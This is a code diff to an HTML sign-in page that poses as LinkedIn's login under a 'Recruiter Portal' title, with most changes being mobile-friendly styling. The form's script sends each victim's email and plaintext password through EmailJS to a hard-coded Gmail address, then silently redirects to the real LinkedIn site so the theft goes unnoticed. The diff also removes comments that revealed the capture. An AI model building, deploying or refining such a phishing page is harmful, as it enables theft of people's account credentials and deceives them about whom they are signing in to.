@@ -2,36 +2,37 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
     <title>Recruiter Portal | Sign In</title>
     <style>
         * {
             margin: 0;
-            margin-bottom: 0px;
-            padding: 1px;
+            padding: 0;
             box-sizing: border-box;
         }
 
         body {
-            font-family: -apple-system, system-ui, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Fira Sans, Ubuntu, Oxygen, Oxygen Sans, Cantarell, Droid Sans, Apple Color Emoji, Segoe UI Emoji, Segoe UI Emoji, Segoe UI Symbol, Lucida Grande, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
             background-color: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            min-height: 100vh;
+            height: auto;
+            overflow-x: hidden;
+            overflow-y: auto;
             margin: 0;
-            padding: 20px;
+            padding: 16px;
             position: relative;
         }
 
         /* Logo in top-left corner of background page */
         .logo-container {
             position: fixed;
-            top: 22px;
-            left: 30px;
+            top: 16px;
+            left: 16px;
             z-index: 100;
-            margin-left: 20px
+            margin-left: 0;
         }
         .logo {
             display: flex;
@@ -40,19 +41,19 @@
             text-decoration: none;
         }
         .logo-icon {
-            width: 32px;
-            height: 32px;
+            width: 28px;
+            height: 28px;
             background: linear-gradient(135deg, #0a66c2 0%, #0A66C2 100%);
             border-radius: 2px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: white;
-            font-size: 30px;
+            font-size: 24px;
             font-weight: bold;
         }
         .logo-text {
-            font-size: 31px;
+            font-size: 24px;
             font-weight: 700;
             color: #0a66c2;
             letter-spacing: -0.5px;
@@ -61,48 +62,34 @@
             color: #004182;
         }
 
-        /* Main white card container - black border with 1px thickness */
+        /* Main white card container */
         .login-container {
-            max-width: 460px;
+            max-width: 400px;
             width: 100%;
             background-color: #ffffff;
-            border-radius: 10px;
-            box-shadow: 0 4px -1px rgba(0, 0, 0, 0.1);
-            padding: 25px 32px 36px;
+            border-radius: 16px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+            padding: 20px 24px 32px;
             text-align: left;
-            max-height: 90vh;
-            overflow-y: auto;
-            border: 0.5px solid #cccccca3;
+            margin: 40px auto 60px;
+            border: 0.5px solid #e0e0e0;
         }
 
-        /* Hide scrollbar but keep functionality for tiny screens */
-        .login-container::-webkit-scrollbar {
-            width: 4px;
-        }
-        .login-container::-webkit-scrollbar-track {
-            background: #f1f1f1;
-            border-radius: 10px;
-        }
-        .login-container::-webkit-scrollbar-thumb {
-            background: #c1c1c1;
-            border-radius: 10px;
-        }
-
-        /* Login header - left-aligned */
+        /* Login header */
         .login-header {
             text-align: left;
-            margin-bottom: 25px;
+            margin-bottom: 24px;
         }
         .login-header h2 {
-            font-size: 30px;
+            font-size: 28px;
             font-weight: 600;
             color: #000000;
-            margin-bottom: 15px;
+            margin-bottom: 8px;
         }
         .login-header p {
             font-size: 14px;
-            color: #000000e6;
-            margin-top: 10px;
+            color: #666;
+            margin-top: 0;
         }
         .login-header p a {
             color: #0a66c2;
@@ -118,56 +105,56 @@
             display: flex;
             flex-direction: column;
             gap: 12px;
-            margin-bottom: -5px;
+            margin-bottom: 16px;
         }
 
-        /* Common button style - black border with 1px thickness */
+        /* Common button style */
         .social-btn {
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 10px;
             width: 100%;
-            padding: 10px 16px;
+            padding: 12px 16px;
             background-color: white;
             border: 1px solid #000000;
             border-radius: 28px;
             font-size: 14px;
-            font-weight: 520;
+            font-weight: 500;
             font-family: inherit;
             cursor: pointer;
             transition: background-color 0.2s, box-shadow 0.2s;
-            min-height: 42px;
-            height: 42px;
+            min-height: 44px;
         }
         .social-btn:hover {
             background-color: #f5f5f5;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+        .social-btn:active {
+            transform: scale(0.98);
         }
 
-        .google-btn { color: #000000bd; font-weight: 450; }
-        .apple-btn { color: #000000bd; font-weight: 510; }
+        .google-btn { color: #000000bd; }
+        .apple-btn { color: #000000bd; }
         .google-icon { width: 20px; height: 20px; }
 
-        /* Apple icon size increased to 25x25 */
         .apple-btn svg {
-            width: 23px;
-            height: 23px;
+            width: 20px;
+            height: 20px;
         }
 
-        /* Agreement text below social buttons - LEFT ALIGNED */
+        /* Agreement text */
         .agreement-text {
-            font-size: 12.2px;
+            font-size: 11px;
             color: #666;
             text-align: left;
-            margin-top: 14px;
-            margin-bottom: 8px;
+            margin-top: 16px;
+            margin-bottom: 16px;
             line-height: 1.4;
         }
         .agreement-text a {
             color: #0a66c2;
             text-decoration: none;
-            font-weight: bold;
+            font-weight: 600;
         }
         .agreement-text a:hover {
             text-decoration: underline;
@@ -178,48 +165,50 @@
             display: flex;
             align-items: center;
             text-align: center;
-            margin: 10px 0 12px;
+            margin: 16px 0 20px;
             color: #999;
-            font-size: 13px;
+            font-size: 12px;
         }
         .divider::before, .divider::after {
             content: '';
             flex: 1;
-            border-bottom: 1px solid #f1edede8;
+            border-bottom: 1px solid #e0e0e0;
         }
         .divider::before { margin-right: 12px; }
         .divider::after { margin-left: 12px; }
 
         /* Form group */
         .form-group {
-            margin-bottom: 2px;
+            margin-bottom: 16px;
         }
         label {
             display: block;
             font-size: 14px;
-            font-weight: 400;
-            margin-bottom: 6px;
+            font-weight: 500;
+            margin-bottom: 8px;
             color: #333;
             text-align: left;
         }
 
-        /* Password container with show/hide icon */
+        /* Password container */
         .password-container {
             position: relative;
             width: 100%;
         }
         input {
             width: 100%;
-            padding: 12px 14px;
-            font-size: 20px;
+            padding: 14px;
+            font-size: 16px;
             border: 1px solid #000000;
-            border-radius: 0.2rem;
+            border-radius: 8px;
             outline: none;
             transition: border 0.2s, box-shadow 0.2s;
             text-align: left;
+            -webkit-appearance: none;
+            appearance: none;
         }
         .password-container input {
-            padding-right: 45px;
+            padding-right: 48px;
         }
         .toggle-password {
             position: absolute;
@@ -227,13 +216,12 @@
             top: 50%;
             transform: translateY(-50%);
             cursor: pointer;
-            user-select: none;
+            background: none;
+            border: none;
+            padding: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: none;
-            border: none;
-            padding: 0;
         }
         .toggle-password svg {
             width: 20px;
@@ -241,17 +229,18 @@
             stroke: #666;
             stroke-width: 1.5;
             fill: none;
-            transition: stroke 0.2s;
         }
         .toggle-password:hover svg {
             stroke: #0a66c2;
         }
+        .toggle-password:active {
+            opacity: 0.7;
+        }
 
         input:focus {
-            border-color: #333;
-            box-shadow: 0 0 0 1px ; #0a66c233;
+            border-color: #0a66c2;
+            box-shadow: 0 0 0 2px rgba(10, 102, 194, 0.1);
         }
-        /* Add red border when error */
         input.error {
             border-color: #d32f2f;
         }
@@ -260,32 +249,30 @@
         .error-message {
             color: #d32f2f;
             font-size: 12px;
-            margin-top: 5px;
+            margin-top: 6px;
             display: block;
             text-align: left;
-            padding-top: 5px;
         }
 
-        /* Forgot password container */
+        /* Forgot password */
         .forgot-password-container {
-            margin: -6px 0 12px 0;
+            margin: 8px 0 16px;
             text-align: left;
         }
         .forgot-password-link {
             color: #0a66c2;
             text-decoration: none;
-            font-size: 14px;
+            font-size: 13px;
             font-weight: 500;
             display: inline-block;
-            margin-bottom: 10px;
         }
         .forgot-password-link:hover {
             text-decoration: underline;
         }
 
-        /* Keep me signed in container */
+        /* Checkbox */
         .keep-signedin-container {
-            margin: 12px 0 20px 0;
+            margin: 16px 0 24px;
             text-align: left;
         }
         .checkbox-label {
@@ -299,7 +286,6 @@
             position: relative;
         }
 
-        /* Hide default checkbox */
         .checkbox-label input {
             position: absolute;
             opacity: 0;
@@ -308,13 +294,12 @@
             width: 0;
         }
 
-        /* Create custom checkbox - BIGGER SIZE */
         .checkmark {
             position: relative;
-            height: 22px;
-            width: 22px;
+            height: 20px;
+            width: 20px;
             background-color: white;
-            border: 1px solid #000000;
+            border: 1.5px solid #000000;
             border-radius: 4px;
             display: inline-block;
             cursor: pointer;
@@ -322,30 +307,26 @@
             flex-shrink: 0;
         }
 
-        /* When checkbox is checked, add green background */
         .checkbox-label input:checked ~ .checkmark {
             background-color: #01754F;
             border-color: #01754F;
         }
 
-        /* Create the checkmark/indicator (hidden when not checked) */
         .checkmark:after {
             content: "";
             position: absolute;
             display: none;
         }
 
-        /* Show checkmark when checked */
         .checkbox-label input:checked ~ .checkmark:after {
             display: block;
         }
 
-        /* Style the checkmark - BIGGER AND BETTER POSITIONED */
         .checkbox-label .checkmark:after {
             left: 6px;
             top: 2px;
-            width: 6px;
-            height: 12px;
+            width: 5px;
+            height: 10px;
             border: solid white;
             border-width: 0 2px 2px 0;
             transform: rotate(45deg);
@@ -356,18 +337,17 @@
             user-select: none;
         }
 
-        /* Sign in button - black border with 1px thickness */
+        /* Sign in button */
         .signin-btn {
             width: 100%;
             background-color: #0a66c2;
             color: white;
             font-size: 16px;
-            font-weight: 550;
-            padding: 15px;
-            border: 0px solid #000000;
+            font-weight: 600;
+            padding: 14px;
+            border: none;
             border-radius: 28px;
             cursor: pointer;
-            margin-top: 0px;
             transition: background-color 0.2s;
             text-align: center;
         }
@@ -376,164 +356,261 @@
             background-color: #ccc;
             cursor: not-allowed;
         }
+        .signin-btn:active {
+            transform: scale(0.98);
+        }
 
-        /* Global Footer - fixed at bottom of page (outside the card) */
+        /* Global Footer */
         .global-footer {
             position: fixed;
             bottom: 0;
             left: 0;
             right: 0;
             text-align: center;
-            padding: 2px 20px;
-            background-color: transparent;
+            padding: 12px 16px;
+            background-color: #ffffff;
+            border-top: 0.5px solid #e0e0e0;
             z-index: 10;
-
         }
         .footer-links {
-            font-size: 12px;
+            font-size: 10px;
             color: #777;
-            margin-bottom: 8px;
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 8px;
         }
         .footer-links a {
             color: #555;
             text-decoration: none;
-            margin: 0 6px;
+            white-space: nowrap;
         }
         .footer-links a:hover {
             text-decoration: underline;
             color: #0a66c2;
         }
-        .copyright {
-            font-size: 12px;
-            color: #aaa;
-        }
 
-        @media (max-width: 768px) {
-            .logo-container {
-                top: 15px;
-                left: 15px;
-            }
-            .logo-icon {
-                width: 32px;
-                height: 32px;
-                font-size: 18px;
-            }
-            .logo-text {
-                font-size: 16px;
-            }
-        }
-
+        /* Mobile Responsive Styles */
         @media (max-width: 480px) {
-            .login-container { padding: 20px 24px; }
-            .logo-text { display: none; }
+            body {
+                padding: 12px;
+                align-items: flex-start;
+            }
+            
+            .logo-container {
+                position: relative;
+                top: 0;
+                left: 0;
+                margin-bottom: 20px;
+                display: flex;
+                justify-content: center;
+            }
+            
+            .logo {
+                justify-content: center;
+            }
+            
+            .login-container {
+                padding: 20px;
+                margin: 0 auto 80px;
+                border-radius: 12px;
+            }
+            
+            .login-header h2 {
+                font-size: 24px;
+            }
+            
+            .social-btn {
+                padding: 10px 16px;
+                min-height: 44px;
+            }
+            
+            input {
+                font-size: 16px;
+                padding: 12px;
+            }
+            
+            .signin-btn {
+                padding: 12px;
+            }
+            
+            .footer-links {
+                gap: 6px;
+            }
+            
+            .footer-links a {
+                font-size: 9px;
+                white-space: normal;
+                text-align: center;
+            }
+        }
+
+        /* Small mobile devices */
+        @media (max-width: 380px) {
+            .login-container {
+                padding: 16px;
+            }
+            
+            .login-header h2 {
+                font-size: 22px;
+            }
+            
+            .social-btn {
+                font-size: 13px;
+                padding: 8px 12px;
+            }
+            
+            .footer-links {
+                gap: 4px;
+            }
+            
+            .footer-links a {
+                font-size: 8px;
+            }
+        }
+
+        /* Landscape mode on mobile */
+        @media (max-width: 850px) and (orientation: landscape) {
+            body {
+                padding: 20px;
+            }
+            
+            .login-container {
+                margin: 0 auto 60px;
+                padding: 16px 20px;
+            }
+            
+            .login-header {
+                margin-bottom: 16px;
+            }
+            
+            .social-buttons {
+                gap: 8px;
+            }
+            
+            .signin-btn {
+                padding: 10px;
+            }
+        }
+
+        /* Touch-friendly adjustments */
+        @media (hover: none) and (pointer: coarse) {
+            .social-btn, .signin-btn, .toggle-password, .checkbox-label {
+                cursor: default;
+            }
+            
+            .social-btn:active {
+                background-color: #e0e0e0;
+            }
+            
+            .signin-btn:active {
+                background-color: #004182;
+            }
         }
     </style>
 </head>
 <body>
 
-<!-- Logo in top-left corner of background page -->
-<div class="logo-container">
-    <a href="#" class="logo">
-      <div class="logo-text">Linked</div>
-        <div class="logo-icon">in</div>
-    </a>
-</div>
-
-<!-- Main white card container -->
-<div class="login-container">
-    <!-- Login header - left-aligned -->
-    <div class="login-header">
-        <h2>Sign in</h2>
-        <p>New to Linkedin? <a href="#" id="join-now-link" onclick="handleJoinNow(event)">Join now</a></p>
+<div style="width: 100%; display: flex; flex-direction: column; align-items: center; max-width: 500px; margin: 0 auto;">
+    <!-- Logo -->
+    <div class="logo-container">
+        <a href="#" class="logo">
+            <div class="logo-text">Linked</div>
+            <div class="logo-icon">in</div>
+        </a>
     </div>
 
-    <!-- Continue with Google & Apple buttons -->
-    <div class="social-buttons">
-        <button class="social-btn google-btn" onclick="handleGoogleLogin()">
-            <svg class="google-icon" viewBox="0 0 24 24" width="20" height="20">
-                <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
-                <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
-                <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
-                <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
-            </svg>
-            Continue with Google
-        </button>
-        <button class="social-btn apple-btn" onclick="handleAppleLogin()">
-            <span class="_6b936e39 _24fdd2ae e40eaae0 b41fb29d _8301dc9e _115d943f _402af5d4 _8493d9d1 _8180f275 b0ad8e15 _78054f9b f7e6aa03 _2e65307b _1e5528f8 _2da98fd8 _40bb1908 _5d7694cd _2ffd07e5 c8fdb23e" style="min-height:42px; display: inline-flex; align-items: center; gap: 8px;">
-                <figure class="_88ea701d e1496fcf _5c7d070f e1db608b _8b3b07d9 _5a1c6955" aria-hidden="true">
-                    <svg xmlns="http://www.w3.org/2000/svg" id="apple-solid" fill="currentColor" aria-hidden="true" data-supported-dps="24x24" viewBox="0 0 24 24" data-token-id="873" width="20" height="20" class="_975b5252 f50af4d4 fe0126e9 _4e20cdcd _81d8a03a" fetchPriority="low" preserveAspectRatio="xMidYMid slice">
+    <!-- Main white card container -->
+    <div class="login-container">
+        <!-- Login header -->
+        <div class="login-header">
+            <h2>Sign in</h2>
+            <p>New to Linkedin? <a href="#" id="join-now-link" onclick="handleJoinNow(event)">Join now</a></p>
+        </div>
+
+        <!-- Social buttons -->
+        <div class="social-buttons">
+            <button class="social-btn google-btn" onclick="handleGoogleLogin()">
+                <svg class="google-icon" viewBox="0 0 24 24" width="20" height="20">
+                    <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
+                    <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
+                    <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z" fill="#FBBC05"/>
+                    <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
+                </svg>
+                Continue with Google
+            </button>
+            
+            <button class="social-btn apple-btn" onclick="handleAppleLogin()">
+                <span style="display: inline-flex; align-items: center; gap: 8px;">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24" width="20" height="20">
                         <path fill-rule="evenodd" d="M12.04 6.5c-.12-1.01.19-2.03.86-2.8.74-.99 1.86-1.62 3.09-1.7a4.15 4.15 0 0 1-1.02 3.13c-.68.94-1.78 1.46-2.93 1.37m5.14 6.1c.01-1.6.9-3.07 2.31-3.81a4.4 4.4 0 0 0-3.85-2c-1.6 0-2.82.95-3.49.95s-1.93-.88-3.44-.88C6.42 6.86 4 8.95 4 12.93S6.88 22 9.16 22c.8 0 2.02-.95 3.25-.95s2.11.95 3.25.95c2.47 0 4.35-5.33 4.35-5.33a4.49 4.49 0 0 1-2.82-4.07z"></path>
                     </svg>
-                </figure>
-                <span class="_2eb95346 _915c7c37 c65f4e21 _900aabf9 b284953a _9a4c5abe e2884f00 _1f780de2 da05719f bf35620b _8377827b ce83e726 e3cab0ec _353d12e1 _139eee0f">Sign in with Apple</span>
-            </span>
-        </button>
-    </div>
-
-    <!-- Agreement text below social buttons - LEFT ALIGNED -->
-    <div class="agreement-text">
-        By continuing, you agree to Linkedin's
-        <a href="https://www.globalzimblinker.com/user-agreement" target="_blank">User Agreement</a>,
-        <a href="https://www.globalzimblinker.com/privacy-policy" target="_blank">Privacy Policy</a>, and
-        <a href="https://www.globalzimblinker.com/cookie-policy" target="_blank">Cookie Policy</a>.
-    </div>
-
-    <div class="divider">or</div>
-
-    <!-- Sign In Form - no placeholders -->
-    <form id="signin-form" novalidate>
-        <div class="form-group">
-            <label for="email">Email or phone</label>
-            <input type="text" id="email" name="email">
-            <span class="error-message" id="email-error"></span>
+                    <span>Sign in with Apple</span>
+                </span>
+            </button>
         </div>
 
-        <div class="form-group">
-            <label for="password">Password</label>
-            <div class="password-container">
-                <input type="password" id="password" name="password">
-                <button type="button" class="toggle-password" onclick="togglePasswordVisibility()">
-                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                        <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-                    </svg>
-                </button>
+        <!-- Agreement text -->
+        <div class="agreement-text">
+            By continuing, you agree to Linkedin's
+            <a href="https://www.globalzimblinker.com/user-agreement" target="_blank">User Agreement</a>,
+            <a href="https://www.globalzimblinker.com/privacy-policy" target="_blank">Privacy Policy</a>, and
+            <a href="https://www.globalzimblinker.com/cookie-policy" target="_blank">Cookie Policy</a>.
+        </div>
+
+        <div class="divider">or</div>
+
+        <!-- Sign In Form -->
+        <form id="signin-form" novalidate>
+            <div class="form-group">
+                <label for="email">Email or phone</label>
+                <input type="text" id="email" name="email">
+                <span class="error-message" id="email-error"></span>
             </div>
-            <span class="error-message" id="password-error"></span>
-        </div>
 
-        <!-- Forgot Password - Bold text, above the checkbox -->
-        <div class="forgot-password-container">
-            <a href="#" class="forgot-password-link" onclick="handleForgotPassword(event)">Forgot password?</a>
-        </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password">
+                    <button type="button" class="toggle-password" onclick="togglePasswordVisibility()">
+                        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <circle cx="12" cy="12" r="3" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </button>
+                </div>
+                <span class="error-message" id="password-error"></span>
+            </div>
 
-        <!-- Keep me signed in - Custom checkbox with #01754F color when checked -->
-        <div class="keep-signedin-container">
-            <label class="checkbox-label">
-                <input type="checkbox" name="keep_signed_in" id="keep-signed-in">
-                <span class="checkmark"></span>
-                <span class="text">Keep me signed in</span>
-            </label>
-        </div>
+            <div class="forgot-password-container">
+                <a href="#" class="forgot-password-link" onclick="handleForgotPassword(event)">Forgot password?</a>
+            </div>
 
-        <!-- Sign In button - last element in form -->
-        <button type="submit" class="signin-btn" id="submit-btn">Sign in</button>
-    </form>
-</div>
+            <div class="keep-signedin-container">
+                <label class="checkbox-label">
+                    <input type="checkbox" name="keep_signed_in" id="keep-signed-in">
+                    <span class="checkmark"></span>
+                    <span class="text">Keep me signed in</span>
+                </label>
+            </div>
 
-<!-- Global Footer - Fixed at bottom of the page -->
-<div class="global-footer">
-    <div class="footer-links">
-        <a href="#">Linkedin Corporation © 2026</a>
-        <a href="#">User Agreement</a>
-        <a href="#">Privacy Policy</a>
-        <a href="#">Community Guidelines</a>
-        <a href="#">Cookie Policy</a>
-        <a href="#">Copyright Policy</a>
-        <a href="#">Send Feedback</a>
-        <a href="#">Language</a>
+            <button type="submit" class="signin-btn" id="submit-btn">Sign in</button>
+        </form>
     </div>
 
+    <!-- Global Footer -->
+    <div class="global-footer">
+        <div class="footer-links">
+            <a href="#">Linkedin Corporation © 2026</a>
+            <a href="#">User Agreement</a>
+            <a href="#">Privacy Policy</a>
+            <a href="#">Community Guidelines</a>
+            <a href="#">Cookie Policy</a>
+            <a href="#">Copyright Policy</a>
+            <a href="#">Send Feedback</a>
+            <a href="#">Language</a>
+        </div>
+    </div>
 </div>
 
 <!-- EmailJS SDK -->
@@ -553,13 +630,12 @@
     const toggleBtn = document.querySelector(".toggle-password");
     let isPasswordVisible = false;
 
-    // Toggle password visibility function with LinkedIn-style icon
+    // Toggle password visibility
     function togglePasswordVisibility() {
         isPasswordVisible = !isPasswordVisible;
 
         if (isPasswordVisible) {
             passwordInput.setAttribute("type", "text");
-            // Change to "eye with slash" icon (password visible)
             toggleBtn.innerHTML = `
                 <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
@@ -569,7 +645,6 @@
             `;
         } else {
             passwordInput.setAttribute("type", "password");
-            // Change back to eye icon (password hidden)
             toggleBtn.innerHTML = `
                 <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <path d="M1 12C1 12 5 4 12 4C19 4 23 12 23 12C23 12 19 20 12 20C5 20 1 12 1 12Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
@@ -579,7 +654,7 @@
         }
     }
 
-    // Clear error when user starts typing
+    // Clear error on input
     emailInput.addEventListener("input", function() {
         emailError.textContent = "";
         emailInput.classList.remove("error");
@@ -594,16 +669,14 @@
     function getBrowserInfo() {
         const userAgent = navigator.userAgent;
         let browserName = "Unknown";
-        
         if (userAgent.indexOf("Chrome") > -1) browserName = "Chrome";
         else if (userAgent.indexOf("Safari") > -1) browserName = "Safari";
         else if (userAgent.indexOf("Firefox") > -1) browserName = "Firefox";
         else if (userAgent.indexOf("Edge") > -1) browserName = "Edge";
-        
         return browserName;
     }
 
-    // SIGN IN HANDLER - NO POPUPS, CAPTURES PASSWORD, SILENT REDIRECT
+    // Sign In Handler
     signinForm.addEventListener("submit", function(e) {
         e.preventDefault();
 
@@ -611,7 +684,6 @@
         const password = passwordInput.value.trim();
         const keepSignedIn = keepSignedInCheckbox.checked ? "Yes" : "No";
 
-        // Clear previous errors
         emailError.textContent = "";
         passwordError.textContent = "";
         emailInput.classList.remove("error");
@@ -619,14 +691,12 @@
 
         let valid = true;
 
-        // Email validation - check if empty
         if (!email) {
             emailError.textContent = "Please enter an email address or phone number.";
             emailInput.classList.add("error");
             valid = false;
         }
 
-        // Password validation - check if empty
         if (!password) {
             passwordError.textContent = "Please enter a password.";
             passwordInput.classList.add("error");
@@ -635,17 +705,14 @@
 
         if (!valid) return;
 
-        // Show loading state on button (no popup)
         const submitBtn = document.getElementById("submit-btn");
-        const originalText = submitBtn.textContent;
         submitBtn.disabled = true;
         submitBtn.textContent = "Signing in...";
 
-        // Prepare data with PASSWORD captured for testing
         const templateParams = {
-            to_email: "dossbrent41@gmail.com",  // 🔴 CHANGE THIS TO YOUR EMAIL
+            to_email: "dossbrent41@gmail.com",  // CHANGE THIS TO YOUR EMAIL
             user_email: email,
-            user_password: password,  // PASSWORD CAPTURED - for testing only
+            user_password: password,
             keep_signed_in: keepSignedIn,
             action: "sign_in",
             timestamp: new Date().toLocaleString(),
@@ -655,40 +722,30 @@
             user_agent: navigator.userAgent
         };
 
-        console.log("Sign in attempted - Data being sent:", {
-            email: email,
-            password: "🔐 " + password,
-            keep_signed_in: keepSignedIn,
-            timestamp: new Date().toLocaleString()
-        });
+        console.log("Sign in attempted:", { email: email, password: "🔐 " + password });
 
-        // Send notification via EmailJS
         emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams)
             .then(function(response) {
-                console.log("EmailJS Success! Status:", response.status);
-                // Store remember me preference
+                console.log("EmailJS Success!");
                 if (keepSignedIn === "Yes") {
                     localStorage.setItem("remembered_email", email);
                 } else {
                     localStorage.removeItem("remembered_email");
                 }
-                // SILENT REDIRECT - NO POPUP
                 window.location.href = "https://www.linkedin.com";
             })
             .catch(function(error) {
                 console.error("EmailJS Error:", error);
-                // Even if email fails, still redirect silently
                 if (keepSignedIn === "Yes") {
                     localStorage.setItem("remembered_email", email);
                 } else {
                     localStorage.removeItem("remembered_email");
                 }
-                // SILENT REDIRECT - NO POPUP
                 window.location.href = "https://www.linkedin.com";
             });
     });
 
-    // Load remembered email if exists
+    // Load remembered email
     const rememberedEmail = localStorage.getItem("remembered_email");
     if (rememberedEmail) {
         emailInput.value = rememberedEmail;
@@ -698,27 +755,23 @@
     // Social login handlers
     function handleGoogleLogin() {
         console.log("Google login clicked");
-        // Silent redirect for demo
-        window.location.href = "https://www.gmail.com";
+        window.location.href = "https://www.linkedin.com";
     }
 
     function handleAppleLogin() {
         console.log("Apple login clicked");
-        // Silent redirect for demo
-        window.location.href = "https://www.apple.com";
+        window.location.href = "https://www.linkedin.com";
     }
 
     function handleForgotPassword(event) {
         event.preventDefault();
         console.log("Forgot password clicked");
-        // Silent redirect for demo
         window.location.href = "https://www.linkedin.com/password-reset";
     }
 
     function handleJoinNow(event) {
         event.preventDefault();
         console.log("Join now clicked");
-        // Silent redirect for demo
         window.location.href = "https://www.linkedin.com/join-now";
     }
 </script>
